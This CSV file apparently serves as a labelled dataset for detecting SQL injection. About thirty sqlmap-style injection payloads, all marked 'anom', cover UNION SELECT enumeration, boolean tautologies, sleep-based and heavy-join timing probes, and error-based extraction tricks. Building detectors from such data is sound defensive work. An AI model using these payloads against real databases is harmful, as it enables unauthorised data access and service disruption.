payload,label
1' where 3337=3337 and 8403=5760,anom
"1' in boolean mode) and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",anom
"1'||(select 'xuou' from dual where 7681=7681 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)))||'",anom
"-9398' union all select 3998,3998,3998,3998,3998,3998,3998,3998,3998#",anom
1'+(select iwbs where 4939=4939;begin user_lock.sleep(5); end--,anom
-8080')) order by 1#,anom
"1',(select (case when (2073=5314) then 1 else 1/(select 0) end))",anom
"1')) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (('novq'='novq",anom
"1) union all select null,null,null,null#",anom
"1') as bfgl where 8959=8959 union all select null,null,null,null,null,null,null,null,null,null--",anom
"1"")) and 8329=5584#",anom
"1;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5-- mkoo",anom
"1'));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and (('gfln'='gfln",anom
"-5245""))) union all select 8106,8106,8106#",anom
"-5606)) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",anom
"1') as jwch where 4609=4609;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",anom
"1 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)# zcyc",anom
"-1917"") or 8571=8571--",anom
"-6815 where 7609=7609 or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",anom
1) where 4992=4992;select case when 7717=7717 then 1 else null end--,anom
"1'||(select 'gmkp' where 6016=6016;select count(*) from generate_series(1,5000000))||'",anom
"1' where 5801=5801 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)--",anom
-8513' union all select 7414--,anom
"-9736' or make_set(7311=2067,2067) and 'czdt' like 'czdt",anom
1) as jmib where 8130=8130 rlike (select (case when (7885=3932) then 1 else 0x28 end))--,anom
1) rlike (select * from (select(sleep(5)))sgvo),anom
"-3587') or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ('psqt' like 'psqt",anom
"-6086"" union all select 8700,8700,8700,8700--",anom
"1')) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (('aovy'='aovy",anom
"1')) and elt(4460=2665,2665) and (('qmzu'='qmzu",anom
